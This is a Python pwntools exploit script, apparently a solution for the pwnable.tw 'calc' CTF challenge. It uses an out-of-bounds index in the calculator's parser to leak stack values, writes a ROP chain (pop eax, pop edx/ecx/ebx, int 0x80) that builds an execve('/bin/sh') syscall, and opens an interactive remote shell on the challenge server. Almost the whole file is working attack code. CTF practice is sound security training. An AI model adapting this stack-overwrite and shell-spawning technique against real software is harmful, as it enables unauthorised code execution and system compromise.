#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("calc")
libc = elf.libc

local = False 
if local:
    p = process("./calc")
    gdb.attach(p,'''
    b*calc+152   
    c
    c
    c
    c
    c
    c
    c
    c
    c
    
    ''')
else:
    p = remote('chall.pwnable.tw', 10100)

elf = context.binary = ELF('./calc', checksec=False)


pop_eax = 0x0805c34b
pop_edx_ecx_ebx = 0x080701d0
int_0x80 = 0x08049a21


p.recvuntil(b"=== Welcome to SECPROG calculator ===")
p.recvline()
print("==============================================")

def form(addr, value, value2):
    print("[+]Value of this addr: ", hex(value2))
    print("[+]Change to value: ", hex(value))
    print("[+]Calculate: ", value-value2)
    if (value > value2):
        payload = addr.decode() + "+" + str(value - value2)
    else:
        payload = addr.decode() + str(value - value2)
    # Encode payload to bytes using UTF-8 encoding
    payload = payload.encode('utf-8')
    print(payload)
    p.sendline(payload)
    print("Done")
    print("==============================================")


payload = b"+360"
p.sendline(payload)
leak_binsh = int(p.recvline().strip())
if (leak_binsh < 0):
    leak_binsh = 0xffffffff + leak_binsh + 1
# Convert string to integer
print("[+]/bin/sh addr: ", hex(leak_binsh))
print("==============================================")

payload = "+361"
p.sendline(payload)
leak = int(p.recvline().strip())
if (leak < 0):
    leak = 0xffffffff + leak + 1
# Convert string to integer
print("[+]leak addr 361: ", hex(leak))
leak_361 = leak
print("==============================================")




form(b"+361", pop_eax, leak_361)
#form(b"+362", 0xb, leak_362)
payload = b"+362-77490+11"
p.sendline(payload)
#form(b"+363", pop_edx_ecx_ebx, leak_363)
payload = b"+363-11+134676944"
p.sendline(payload)
#form(b"+364", 0x0, leak_364)
payload = b"+364-134676944"
p.sendline(payload)
#form(b"+365", 0x0, leak_365)
payload = b"+365-134676944"
p.sendline(payload)
#form(b"+366", leak_binsh, leak_366)
# Convert integer to bytes

leak_binsh_bytes = str(0xffffffff-leak_binsh+134676945).encode('utf-8')
payload = b"+366-" + leak_binsh_bytes
p.sendline(payload)
print(payload)
#form(b"+367", int_0x80, leak_367)
# Convert integers to bytes
leak_binsh_bytes = str(0xffffffff-leak_binsh+134676945).encode('utf-8')
int_0x80_bytes = str(int_0x80).encode('utf-8')

# Concatenate byte strings
payload = b"+367-" + leak_binsh_bytes + b"+" + int_0x80_bytes

p.sendline(payload)
#form(b"+368", 0x6e69622f, leak_368)
payload = b"+368+1717880846"
p.sendline(payload)
#form(b"+369", 0x68732f, leak_369)
payload = b"+369-1711035615"

p.sendline(payload)
p.interactive()
